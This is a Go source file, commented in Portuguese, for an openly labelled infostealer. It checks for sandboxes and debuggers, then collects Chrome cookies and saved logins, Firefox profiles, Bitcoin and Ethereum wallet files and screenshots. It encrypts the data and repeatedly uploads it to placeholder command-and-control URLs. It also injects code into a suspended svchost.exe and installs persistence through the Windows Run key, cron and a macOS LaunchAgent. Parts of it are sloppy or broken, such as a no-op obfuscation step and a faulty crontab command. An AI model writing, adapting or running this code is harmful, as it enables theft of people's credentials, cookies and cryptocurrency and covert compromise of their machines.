package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"fmt"
	"image/png"
	"io"
	mrand "math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"github.com/kbinani/screenshot"
	"github.com/klauspost/compress/zlib"
	"golang.org/x/sys/windows"
)

// Chave de criptografia derivada do hostname e do primeiro MAC disponível
func generateKey() []byte {
	h, _ := os.Hostname()
	ifaces, _ := net.Interfaces()
	mac := ""
	for _, iface := range ifaces {
		if hw := iface.HardwareAddr.String(); hw != "" {
			mac = hw
			break
		}
	}
	hash := sha256.Sum256([]byte(h + mac))
	return hash[:]
}

// Ofuscação polimórfica de strings
func obfuscate(s string, key []byte) string {
	b := make([]byte, len(s))
	for i := 0; i < len(s); i++ {
		b[i] = s[i] ^ key[i%len(key)]
	}
	return base64.RawURLEncoding.EncodeToString(b)
}

// Desofuscação de strings
func deobfuscate(s string, key []byte) string {
	b, _ := base64.RawURLEncoding.DecodeString(s)
	result := make([]byte, len(b))
	for i := 0; i < len(b); i++ {
		result[i] = b[i] ^ key[i%len(key)]
	}
	return string(result)
}

// Estrutura para dados coletados
type Info struct {
	Username      string
	Hostname      string
	OS            string
	Files         map[string]string
	Credentials   []string
	Screenshot    []byte
	CryptoWallets []string
}

// Verifica se está em ambiente de análise (sandbox/VM)
func isSandbox() bool {
	// Verifica tempo de execução
	start := time.Now()
	time.Sleep(10 * time.Millisecond)
	if time.Since(start) > 50*time.Millisecond {
		return true
	}

	// Verifica memória baixa
	var mem windows.MemoryStatusEx
	mem.Length = uint32(unsafe.Sizeof(mem))
	windows.GlobalMemoryStatusEx(&mem)
	if mem.TotalPhys < 2*1024*1024*1024 { // Menos de 2GB
		return true
	}

	// Verifica processos de análise
	procs := []string{"wireshark.exe", "vboxservice.exe", "vmtoolsd.exe", "procmon.exe"}
	for _, proc := range procs {
		cmd := exec.Command("tasklist")
		output, _ := cmd.Output()
		if strings.Contains(string(output), proc) {
			return true
		}
	}

	// Verifica presença de debugger
	if syscall.IsDebuggerPresent() {
		return true
	}

	return false
}

// Captura de tela real
func takeScreenshot() ([]byte, error) {
	n := screenshot.NumActiveDisplays()
	if n <= 0 {
		return nil, fmt.Errorf("nenhum display ativo")
	}

	bounds := screenshot.GetDisplayBounds(0)
	img, err := screenshot.CaptureRect(bounds)
	if err != nil {
		return nil, err
	}

	var buf bytes.Buffer
	if err := png.Encode(&buf, img); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

// Coleta informações do sistema
func collectSystemInfo() Info {
	info := Info{
		Files:         make(map[string]string),
		Credentials:   []string{},
		CryptoWallets: []string{},
	}

	// Coleta nome de usuário e hostname
	u, _ := user.Current()
	info.Username = u.Username
	h, _ := os.Hostname()
	info.Hostname = h
	info.OS = runtime.GOOS + " " + runtime.GOARCH

	// Coleta arquivos sensíveis
	paths := []string{
		filepath.Join(os.Getenv("APPDATA"), "Google", "Chrome", "User Data", "Default", "Cookies"),
		filepath.Join(os.Getenv("APPDATA"), "Google", "Chrome", "User Data", "Default", "Login Data"),
		filepath.Join(os.Getenv("APPDATA"), "Mozilla", "Firefox", "Profiles"),
		filepath.Join(os.Getenv("APPDATA"), "Bitcoin", "wallet.dat"),
		filepath.Join(os.Getenv("APPDATA"), "Ethereum", "keystore"),
	}
	for _, path := range paths {
		files, _ := filepath.Glob(path + "/*")
		for _, file := range files {
			content, err := os.ReadFile(file)
			if err == nil {
				info.Files[file] = base64.StdEncoding.EncodeToString(content)
			}
		}
	}

	// Coleta credenciais
	for _, path := range paths {
		if strings.Contains(path, "Login Data") {
			content, err := os.ReadFile(path)
			if err == nil {
				info.Credentials = append(info.Credentials, base64.StdEncoding.EncodeToString(content))
			}
		}
	}

	// Coleta carteiras de criptomoedas
	for _, path := range paths {
		if strings.Contains(path, "wallet.dat") || strings.Contains(path, "keystore") {
			info.CryptoWallets = append(info.CryptoWallets, path)
		}
	}

	// Captura de tela
	if screenshotData, err := takeScreenshot(); err == nil {
		info.Screenshot = screenshotData
	}

	return info
}

// Criptografia AES-GCM
func encrypt(data []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}
	return gcm.Seal(nonce, nonce, data, nil), nil
}

// Compressão de dados
func compress(data []byte) ([]byte, error) {
	var b bytes.Buffer
	w, err := zlib.NewWriterLevel(&b, zlib.BestCompression)
	if err != nil {
		return nil, err
	}
	if _, err = w.Write(data); err != nil {
		w.Close()
		return nil, err
	}
	if err = w.Close(); err != nil {
		return nil, err
	}
	return b.Bytes(), nil
}

// Exfiltração para servidor C2
func exfiltrate(data string, screenshot []byte, key []byte) error {
	client := &http.Client{Timeout: 15 * time.Second}
	domains := []string{
		obfuscate("https://backup1.example.com/upload", key),
		obfuscate("https://backup2.example.com/upload", key),
	}
	for _, domain := range domains {
		url := deobfuscate(domain, key)
		compressed, err := compress([]byte(data))
		if err != nil {
			continue
		}
		encrypted, err := encrypt(compressed, key)
		if err != nil {
			continue
		}

		resp, err := client.Post(url, "application/octet-stream", bytes.NewReader(encrypted))
		if err == nil {
			resp.Body.Close()
		}

		if len(screenshot) > 0 {
			compressedShot, err := compress(screenshot)
			if err == nil {
				encryptedShot, err := encrypt(compressedShot, key)
				if err == nil {
					resp, err := client.Post(url+"/screenshot", "application/octet-stream", bytes.NewReader(encryptedShot))
					if err == nil {
						resp.Body.Close()
					}
				}
			}
		}

		if err == nil {
			return nil
		}
	}
	return fmt.Errorf("exfiltração falhou")
}

// Injeção em processo real
func injectIntoProcess(key []byte) error {
	var procInfo syscall.ProcessInformation
	var startInfo syscall.StartupInfo

	// Inicia svchost.exe em estado suspenso
	cmd := deobfuscate(obfuscate("svchost.exe", key), key)
	err := syscall.CreateProcess(
		nil,
		syscall.StringToUTF16Ptr(cmd),
		nil,
		nil,
		false,
		syscall.CREATE_SUSPENDED,
		nil,
		nil,
		&startInfo,
		&procInfo,
	)
	if err != nil {
		return err
	}

	// Payload simples para injeção (exemplo: exibe mensagem)
	payload := []byte{
		0x90, 0x90, 0x90, // NOP sled
		0xC3, // RET
	}

	// Aloca memória no processo remoto
	var baseAddr uintptr
	var size = uintptr(len(payload))
	err = windows.VirtualAllocEx(
		procInfo.Process,
		0,
		size,
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE,
		&baseAddr,
	)
	if err != nil {
		return err
	}

	// Escreve payload no processo remoto
	var bytesWritten uintptr
	err = windows.WriteProcessMemory(
		procInfo.Process,
		baseAddr,
		&payload[0],
		size,
		&bytesWritten,
	)
	if err != nil {
		return err
	}

	// Cria thread remota para executar o payload
	var threadId uint32
	_, err = windows.CreateRemoteThread(
		procInfo.Process,
		nil,
		0,
		baseAddr,
		0,
		0,
		&threadId,
	)
	if err != nil {
		return err
	}

	// Retoma a execução do processo
	windows.ResumeThread(procInfo.Thread)
	return nil
}

// Persistência multiplataforma
func ensurePersistence(key []byte) {
	switch runtime.GOOS {
	case "windows":
		keyPath := deobfuscate(obfuscate(`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`, key), key)
		cmd := deobfuscate(obfuscate(os.Args[0], key), key)
		syscall.RegSetValueEx(
			syscall.HKEY_CURRENT_USER,
			syscall.StringToUTF16Ptr(keyPath),
			0,
			syscall.REG_SZ,
			(*byte)(unsafe.Pointer(syscall.StringToUTF16Ptr(cmd))),
			uint32(len(cmd)*2),
		)
	case "linux":
		cron := deobfuscate(obfuscate("*/5 * * * * "+os.Args[0], key), key)
		exec.Command("crontab", "-l").Run()
		exec.Command("echo", cron, ">>", "/tmp/cron").Run()
		exec.Command("crontab", "/tmp/cron").Run()
	case "darwin":
		plist := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.user.agent</string>
    <key>ProgramArguments</key>
    <array>
        <string>%s</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>`, os.Args[0])
		os.WriteFile(os.Getenv("HOME")+"/Library/LaunchAgents/com.user.agent.plist", []byte(plist), 0644)
	}
}

func main() {
	if isSandbox() {
		os.Exit(0) // Sai silenciosamente em sandbox
	}

	key := generateKey()
	fmt.Println(deobfuscate(obfuscate("Iniciando infostealer...", key), key))

	// Persistência
	ensurePersistence(key)

	// Injeção em processos
	if err := injectIntoProcess(key); err != nil {
		fmt.Println("falha na injeção:", err)
	}

	// Coleta de dados
	info := collectSystemInfo()

	// Serializa dados
	data := fmt.Sprintf("Username: %s\nHostname: %s\nOS: %s\nFiles: %v\nCredentials: %v\nWallets: %v",
		info.Username, info.Hostname, info.OS, info.Files, info.Credentials, info.CryptoWallets)

	mrand.Seed(time.Now().UnixNano())
	// Exfiltração
	go func() {
		for {
			exfiltrate(data, info.Screenshot, key)
			time.Sleep(time.Duration(5+mrand.Intn(5)) * time.Minute) // Intervalo aleatório
		}
	}()

	// Mantém execução discreta
	for {
		time.Sleep(60 * time.Second)
	}
}
